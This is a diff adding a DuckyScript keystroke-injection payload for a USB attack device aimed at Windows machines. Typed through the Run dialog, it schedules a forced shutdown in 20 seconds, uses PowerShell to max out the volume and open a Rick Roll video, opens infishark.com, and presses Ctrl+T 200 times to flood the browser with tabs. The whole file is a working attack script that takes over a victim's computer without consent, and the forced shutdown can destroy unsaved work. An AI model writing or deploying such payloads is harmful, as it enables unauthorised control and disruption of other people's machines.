@@ -1,0 +1,19 @@
+DELAY 500
+GUI r
+DELAY 750
+STRING shutdown /s /t 20
+ENTER
+GUI r
+DELAY 500
+STRING powershell $vol=new-object -com wscript.shell ; For($i=0; $i -le 50; $i++){$vol.SendKeys([char]175)}; start "https://youtu.be/dQw4w9WgXcQ" ;
+ENTER
+DELAY 8000
+STRING f
+DELAY 500
+GUI r
+DELAY 750
+STRING https://infishark.com
+ENTER
+DELAY 2000
+CTRL t
+REPEAT 200
